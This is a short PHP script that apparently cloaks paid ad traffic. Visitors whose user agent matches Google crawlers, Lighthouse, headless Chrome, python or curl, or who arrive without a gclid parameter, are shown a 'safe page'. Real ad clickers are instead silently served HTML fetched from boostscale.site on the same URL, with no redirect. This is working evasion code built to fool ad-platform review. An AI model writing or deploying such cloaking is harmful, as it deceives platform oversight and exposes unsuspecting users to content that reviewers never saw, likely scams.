<?php
define('SECURE_ENTRY', true);

// 1. Bot Verification
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$isBot = (bool) preg_match('/(googlebot|adsbot-google|mediapartners-google|lighthouse|headlesschrome|python|curl)/i', $userAgent);

// 2. Strict GCLID Verification
$hasGclid = isset($_GET['gclid']) && !empty($_GET['gclid']);

// 3. ROUTING
if ($isBot || !$hasGclid) {
    // SAFE PAGE (Google Crawlers)
    include_once('safe-page.php');
    exit();
} else {
    // TARGET PAGE FETCH (Real Ad Clickers)
    // Dynamic Content Fetching - Zero Redirection Header!
    $gclid = htmlspecialchars($_GET['gclid']);
    $targetUrl = "https://boostscale.site/?gclid=" . $gclid;

    // Fetch target HTML silently
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $targetUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    $response = curl_exec($ch);
    curl_close($ch);

    // Render target site content directly on same URL
    echo $response;
    exit();
}
?>